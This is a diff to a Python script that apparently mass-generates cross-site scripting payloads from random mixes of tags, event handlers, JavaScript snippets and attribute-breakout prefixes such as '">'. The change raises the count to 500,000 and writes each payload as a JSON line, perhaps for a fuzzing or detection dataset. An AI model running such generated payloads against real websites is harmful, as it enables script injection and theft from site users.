@@ -43,7 +43,7 @@ extra3s = get_options('extra3')
 payload_format = '{extra1}<{tag}{s1}{extra2}{s2}{handler}{s3}={s4}{js}{s5}>{extra3}'
 
 lists = (extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s)
-for i in range(300000):
+for i in range(500000):
     extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 = list(map(random.choice, lists))
     if (not s1):
         s1 = ' '
@@ -53,7 +53,10 @@ for i in range(300000):
     exec(s, globals(), locals())
     for prefix in ['', '">', "'>", '>']:
         prefix_payload = prefix+payload
-        print(prefix_payload)
+        d = {
+            'payload': prefix_payload,
+        }
+        print(json.dumps(d))
 
 #generate all payloads, but this take too much time and disk space
 #for extra1, tag, s1, extra2, s2, handler, s3, s4, js, s5, extra3 in itertools.product(extra1s, tags, s1s, extra2s, s2s, handlers, s3s, s4s, jss, s5s, extra3s):
